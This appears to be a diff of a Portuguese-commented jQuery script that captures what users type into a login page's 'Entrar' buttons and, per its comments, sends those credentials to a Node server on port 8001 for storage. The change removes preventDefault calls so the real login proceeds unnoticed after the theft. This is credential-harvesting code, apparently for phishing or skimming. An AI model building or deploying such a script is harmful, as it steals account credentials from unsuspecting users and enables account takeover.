@@ -4,13 +4,11 @@ server_port = '8001' // a porta do servidor
 // na primeira página é esse o botão "Entrar"
 $("input[type='submit']").on('click', function(event){
     getCredenciais();
-    event.preventDefault();
 });
 
 // Após errar pela primeira vez, muda a página e é assim que recupera o botão "Entrar"
 $("button[type='submit']").on('click', function(event){
     getCredenciais();
-    event.preventDefault();
 });
 
 // Recupera as credenciais e envia para o servidor Node armazenar
